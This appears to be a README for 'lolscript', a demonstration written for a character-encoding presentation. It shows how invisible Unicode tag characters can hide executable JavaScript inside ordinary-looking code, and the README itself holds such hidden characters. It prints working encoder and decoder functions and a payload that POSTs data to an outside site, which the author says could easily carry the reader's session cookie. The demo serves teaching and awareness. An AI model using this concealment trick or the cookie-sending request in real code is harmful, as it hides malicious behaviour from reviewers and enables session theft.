# lolscript
Perception Exploit - OR - Why you should NEVER EVER EVER copy paste and exectue someone else's code.

written󠄠󠄨󠅬󠅡󠅴󠅥󠄠󠅬󠅡󠅳󠅴󠄠󠅮󠅩󠅧󠅨󠅴󠄩 by **James0x57** for a Character Encoding presentation at [Bitovi](https://www.bitovi.com/) 

-------

Take a look at **lol.js**; *What do you think it does?*

What if I told you it creates and sends a POST request with your cookie information to my attack site?

lol

It does󠅮󠄧󠅴.

--------

In its current obfuscation, the `lolscript` (lol.js) will only run on Little Endian machines.

To run it on Big Endian machines, change the Chinese(?) characters on lines 5 and 6 to `"畮"` and `"敳捡灥"` respectively.

Here's a bit of data to help see part of what's going on:
```
BIG ENDIAN
bitovi   62 69  74 6F  76 69
扩瑯癩    6269   746F    7669

LITTLE ENDIAN
扩瑯癩    6962   6F74    6976
ibotiv   69 62  6F 74  69 76

BIG ENDIAN
楢潴楶    6962   6F74    6976

LITTLE ENDIAN
bitovi   62 69  74 6F  76 69
```

--------

And finally, here’s the functions to encode and decode the hidden stuff. Be nice. Have fun. Show me your awesome
```js
var encoder = function (visibleChar, hiddenMessage) {
  return visibleChar + unescape(hiddenMessage.replace(/./g, function (x) { return "%uDB40%uDD" + x.charCodeAt(0).toString(16); }));
};
var decoder = function (msg) {
  return unescape(escape(msg).replace(/uDB40%uDD/g,[]));
};
```
and this is the payload in `lolscript`:
```js
"l" + encoder("o", `var xhr = new XMLHttpRequest(); xhr.open("POST", "https://bitovi.com/", true); xhr.send(JSON.stringify({ "document.cookie": "this easily could have been your session information. <3" }));`) + "l"
```

Note: It doesn't actually send the cookie info because it's a demo. But it is fewer characters to do that than to write the message I'm sending instead.

Also, bitovi.com isn't an evil attack site. Obviously.



<sub>[inspired by Stefan Judis](https://www.stefanjudis.com/blog/hidden-messages-in-javascript-property-names/)</sub>
